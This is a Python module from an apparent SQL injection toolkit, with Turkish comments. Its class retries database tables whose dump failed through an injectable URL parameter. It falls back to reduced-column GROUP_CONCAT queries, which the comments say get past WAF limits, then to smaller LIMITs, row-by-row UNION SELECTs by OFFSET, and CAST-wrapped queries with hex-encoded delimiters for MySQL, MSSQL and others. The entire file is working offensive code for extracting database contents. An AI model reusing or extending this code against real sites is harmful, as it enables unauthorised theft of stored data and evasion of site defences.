"""
DumpOnaricisi v1.0 — Başarısız Dump Tablolarını Otomatik Onarıcı
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Bir tablo dump edilemediğinde (boş veri, hata, timeout, encoding hatası)
alternatif çekme stratejilerini sırayla dener:

  Strateji 1 — Kolon Azaltma
      GROUP_CONCAT 8 kolon başarısız → 4 → 2 → 1 kolon
      (bazı DBMS'ler veya WAF'lar çok uzun CONCAT değerlerini engeller)

  Strateji 2 — Bireysel SELECT
      Tek GROUP_CONCAT yerine her satır için ayrı SELECT
      (çok satırlı aggregate'ler yerine tekil sorgu)

  Strateji 3 — Limit Azaltma
      LIMIT 100 → 50 → 20 → 5
      (timeout'a düşen büyük tablolar için)

  Strateji 4 — Kolon Değiştirme
      Başarısız kolonlar yerine CAST/COALESCE sarmallı alternatif

tam_veritabani_dump_async() sonucu incelendikten sonra:
  - satir_sayisi == 0 VE hata yok → onar() ile tekrar dene
  - hata var (timeout vb.) → onar() ile tekrar dene

Kullanım:
    from zeka_sistemi.dump_onaricisi import DumpOnaricisi
    onarici = DumpOnaricisi(sql_motoru=sql, log_func=log_dump)
    dump = sql.tam_veritabani_dump_async(url, param, ...)
    onarilmis = onarici.toplu_onar(url, param, dump, post_data=None)

Mozilla Public License 2.0 — AltayHR Developers
"""

import re
from typing import Dict, Any, List, Optional, Callable


class DumpOnaricisi:
    """
    Başarısız dump tablolarını alternatif stratejilerle yeniden çekmeye çalışır.

    Parametreler
    ────────────
    sql_motoru : SQLInjectionMotoru örneği (tam_veritabani_dump_async'in motoruyla aynı)
    log_func   : Log callback (varsayılan: sessiz)
    max_deneme : Her strateji için maksimum deneme (varsayılan: 2)
    """

    _STRATEJILER = ["az_kolon", "kucuk_limit", "tekil_select", "cast_sarma"]

    def __init__(
        self,
        sql_motoru,
        log_func: Optional[Callable] = None,
        max_deneme: int = 2,
    ):
        self.sql    = sql_motoru
        self.log    = log_func or (lambda m: None)
        self._max   = max_deneme

    # ── Toplu onarım ─────────────────────────────────────────────────────────

    def toplu_onar(
        self,
        url: str,
        param: str,
        dump_sonucu: Dict[str, Any],
        post_data=None,
    ) -> Dict[str, Any]:
        """
        Tüm dump sonucunu inceler; boş/hatalı tabloları onar.

        Dönüş: güncellenmiş dump_sonucu (orijinal dict yerinde güncellenir,
               kopyası da döner).
        """
        tablolar = dump_sonucu.get("tablolar", {})
        onarilacaklar = [
            tablo for tablo, data in tablolar.items()
            if (data.get("satir_sayisi", 0) == 0 or data.get("hata"))
            and data.get("kolonlar")  # kolonları bilinen tablolar
        ]

        if not onarilacaklar:
            self.log("[ONARIC] Onarılacak tablo yok — dump tam.")
            return dump_sonucu

        self.log(f"[ONARIC] {len(onarilacaklar)} başarısız tablo tespit edildi — "
                 f"onarım başlatılıyor: {onarilacaklar[:5]}")

        for tablo in onarilacaklar:
            kolonlar = tablolar[tablo].get("kolonlar", [])
            hata     = tablolar[tablo].get("hata", "")
            self.log(f"[ONARIC] ▶ {tablo} onarılıyor (kolonlar={kolonlar[:4]}, "
                     f"hata={hata[:60] if hata else 'boş veri'})")

            yeni_veri = self.onar(url, param, tablo, kolonlar, post_data)
            if yeni_veri:
                tablolar[tablo]["veriler"]     = yeni_veri
                tablolar[tablo]["satir_sayisi"] = len(yeni_veri)
                tablolar[tablo].pop("hata", None)
                tablolar[tablo]["_onarildi"]   = True
                self.log(f"[ONARIC] ✔ {tablo}: {len(yeni_veri)} satır onarıldı")
            else:
                self.log(f"[ONARIC] ✗ {tablo}: onarılamadı — tablo gerçekten boş olabilir")
                tablolar[tablo]["_onarim_basarisiz"] = True

        onarilan = sum(1 for d in tablolar.values() if d.get("_onarildi"))
        self.log(f"[ONARIC] Tamamlandı: {onarilan}/{len(onarilacaklar)} tablo onarıldı")
        return dump_sonucu

    # ── Tekil tablo onarımı ───────────────────────────────────────────────────

    def onar(
        self,
        url: str,
        param: str,
        tablo: str,
        kolonlar: List[str],
        post_data=None,
    ) -> List[Dict]:
        """
        Tek tablo için stratejileri sırayla dener.

        Dönüş: veri listesi (başarısızsa boş list).
        """
        for strateji in self._STRATEJILER:
            try:
                if strateji == "az_kolon":
                    veri = self._az_kolon_dene(url, param, tablo, kolonlar, post_data)
                elif strateji == "kucuk_limit":
                    veri = self._kucuk_limit_dene(url, param, tablo, kolonlar, post_data)
                elif strateji == "tekil_select":
                    veri = self._tekil_select_dene(url, param, tablo, kolonlar, post_data)
                elif strateji == "cast_sarma":
                    veri = self._cast_sarma_dene(url, param, tablo, kolonlar, post_data)
                else:
                    continue

                if veri:
                    self.log(f"[ONARIC] ✔ {tablo}: '{strateji}' stratejisi başarılı "
                             f"({len(veri)} satır)")
                    return veri
                else:
                    self.log(f"[ONARIC] {tablo}: '{strateji}' → 0 satır")
            except Exception as e:
                self.log(f"[ONARIC] {tablo}: '{strateji}' hata: {e}")

        return []

    # ── Strateji 1: Kolon azaltma ─────────────────────────────────────────────

    def _az_kolon_dene(
        self, url, param, tablo, kolonlar, post_data
    ) -> List[Dict]:
        """Kolon sayısını kademeli azaltarak tekrar dene: 8→4→2→1."""
        for n in [4, 2, 1]:
            if n >= len(kolonlar):
                continue
            alt_kolonlar = kolonlar[:n]
            self.log(f"[ONARIC] {tablo}: {n} kolon ile deneniyor {alt_kolonlar}")
            try:
                veri = self.sql.tablo_verisi_cek(
                    url, param, tablo, alt_kolonlar, limit=100, post_data=post_data
                )
                if veri:
                    # Eksik kolonları boş string ile doldur
                    eksik = kolonlar[n:]
                    for satir in veri:
                        for k in eksik:
                            satir.setdefault(k, "")
                    return veri
            except Exception:
                continue
        return []

    # ── Strateji 2: Limit azaltma ─────────────────────────────────────────────

    def _kucuk_limit_dene(
        self, url, param, tablo, kolonlar, post_data
    ) -> List[Dict]:
        """LIMIT'i küçülterek tekrar dene: 100→50→20→5."""
        for limit in [50, 20, 5]:
            self.log(f"[ONARIC] {tablo}: LIMIT {limit} ile deneniyor")
            try:
                veri = self.sql.tablo_verisi_cek(
                    url, param, tablo, kolonlar[:8], limit=limit, post_data=post_data
                )
                if veri:
                    return veri
            except Exception:
                continue
        return []

    # ── Strateji 3: Bireysel SELECT ───────────────────────────────────────────

    def _tekil_select_dene(
        self, url, param, tablo, kolonlar, post_data
    ) -> List[Dict]:
        """
        Aggregate GROUP_CONCAT yerine her satır için ayrı OFFSET sorgusu.
        Küçük tablolar için güvenilir fallback.
        """
        veri = []
        kolon_str = ", ".join(kolonlar[:4])

        for offset in range(0, 20):  # ilk 20 satırı tekil çek
            sorgu = f"SELECT {kolon_str} FROM {tablo} LIMIT 1 OFFSET {offset}"
            try:
                sonuc = self.sql.union_sorgu_calistir(
                    url, param, sorgu, post_data=post_data
                )
                if not sonuc:
                    break  # tablo bitti
                # Sonucu parse et — '|VLX|' separator yoksa düz string
                satir = {}
                if "|VLX|" in str(sonuc):
                    parcalar = str(sonuc).split("|VLX|")
                    for i, k in enumerate(kolonlar[:4]):
                        satir[k] = parcalar[i].strip() if i < len(parcalar) else ""
                else:
                    satir[kolonlar[0]] = str(sonuc).strip()
                    for k in kolonlar[1:4]:
                        satir[k] = ""
                veri.append(satir)
            except Exception:
                break

        return veri

    # ── Strateji 4: CAST sarma ────────────────────────────────────────────────

    def _cast_sarma_dene(
        self, url, param, tablo, kolonlar, post_data
    ) -> List[Dict]:
        """
        Kolon adlarını CAST(kolon AS CHAR)/CAST(kolon AS TEXT) ile sar.
        Tip uyumsuzluğundan kaynaklanan boş sonuçları düzeltir.
        """
        dbms = getattr(self.sql, "tespit_dbms", None) or "MySQL"
        def _cast(k):
            if dbms in ("MySQL", "MariaDB"):
                return f"CAST({k} AS CHAR)"
            elif dbms == "Microsoft SQL Server":
                return f"CAST({k} AS NVARCHAR(MAX))"
            else:
                return f"CAST({k} AS TEXT)"

        sarili_kolonlar = [_cast(k) for k in kolonlar[:8]]
        self.log(f"[ONARIC] {tablo}: CAST sarmalı kolonlarla deneniyor")
        try:
            # geçici alias ile çek
            alias_kolonlar = [f"k{i}" for i in range(len(sarili_kolonlar))]
            # tablo_verisi_cek'e gerçek kolon adlarını ver,
            # ama sorgu içinde CAST kullanmak için manuel sorgu yaz
            sorgu_parcalar = ", ".join(
                f"{sc} as {ac}"
                for sc, ac in zip(sarili_kolonlar, alias_kolonlar)
            )
            # Doğrudan union_sorgu_calistir ile GROUP_CONCAT
            if dbms in ("MySQL", "MariaDB"):
                birles = ", 0x7C564C587C, ".join(sarili_kolonlar)
                sorgu = f"SELECT GROUP_CONCAT(CONCAT(0x564C587C, {birles}, 0x564C5845) SEPARATOR 0x3C524F573E) FROM {tablo} LIMIT 100"
            else:
                birles = "||'|VLX|'||".join(sarili_kolonlar)
                sorgu = f"SELECT string_agg('VLX|'||{birles}||'VLXE','<ROW>') FROM (SELECT * FROM {tablo} LIMIT 100) t"

            sonuc = self.sql.union_sorgu_calistir(url, param, sorgu, post_data=post_data)
            if not sonuc:
                return []

            # Sonucu basit şekilde parse et
            veri = []
            for satir_ham in str(sonuc).split("<ROW>"):
                satir_ham = satir_ham.strip()
                if not satir_ham:
                    continue
                parcalar = re.split(r'[|,]', satir_ham)
                satir = {}
                for i, k in enumerate(kolonlar[:8]):
                    satir[k] = parcalar[i].strip() if i < len(parcalar) else ""
                veri.append(satir)
            return veri

        except Exception as e:
            self.log(f"[ONARIC] CAST stratejisi hata: {e}")
            return []

    # ── Durum raporu ──────────────────────────────────────────────────────────

    def onarim_raporu(self, dump_sonucu: Dict[str, Any]) -> Dict[str, Any]:
        """Onarım sonrası özet istatistik döner."""
        tablolar  = dump_sonucu.get("tablolar", {})
        onarildi  = [t for t, d in tablolar.items() if d.get("_onarildi")]
        basarisiz = [t for t, d in tablolar.items() if d.get("_onarim_basarisiz")]
        tamam     = [t for t, d in tablolar.items()
                     if not d.get("_onarildi") and not d.get("_onarim_basarisiz")
                     and d.get("satir_sayisi", 0) > 0]
        return {
            "tamam":         tamam,
            "onarildi":      onarildi,
            "basarisiz":     basarisiz,
            "tamam_sayisi":  len(tamam),
            "onarildi_sayisi": len(onarildi),
            "basarisiz_sayisi": len(basarisiz),
        }
